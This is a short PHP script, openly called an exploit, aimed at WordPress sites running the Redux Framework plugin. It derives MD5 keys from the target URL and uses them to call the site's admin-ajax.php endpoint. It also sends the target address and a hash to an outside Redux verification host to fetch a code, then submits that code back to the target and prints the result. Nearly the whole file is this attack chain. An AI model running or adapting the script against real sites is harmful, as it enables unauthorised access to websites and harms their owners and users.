<?php

$target = "https://target.com";

// Function to safely get content from URL with error handling
function getUrlContent($url) {
    $options = [
        'http' => [
            'method' => 'GET',
            'header' => "User-Agent: Mozilla/5.0\r\n"
        ]
    ];
    $context = stream_context_create($options);
    $response = file_get_contents($url, false, $context);
    
    if ($response === FALSE) {
        error_log("Error fetching content from URL: $url");
        return null;
    }

    return $response;
}

// Generate MD5 hash
function generateMd5($input) {
    return md5($input);
}

// Main function to execute the exploit
function executeExploit($target) {
    $key1 = generateMd5("$target/-redux");

    $url1 = "$target/wp-admin/admin-ajax.php?action=$key1";
    $key2 = getUrlContent($url1);

    if ($key2 === null) {
        die('Error: Unable to fetch the first key content');
    }

    $key3 = generateMd5($key2 . '-support');

    $redux_code_url = "http://verify.redux.io/?hash=$key3&site=$target";
    $redux_code = getUrlContent($redux_code_url);

    if ($redux_code === null) {
        die('Error: Unable to fetch Redux code');
    }

    $final_url = "$target/wp-admin/admin-ajax.php?action=$key3&code=$redux_code";
    $final_response = getUrlContent($final_url);

    if ($final_response === null) {
        die('Error: Unable to fetch the final response');
    }

    echo $final_response;
}

// Execute the exploit
executeExploit($target);

?>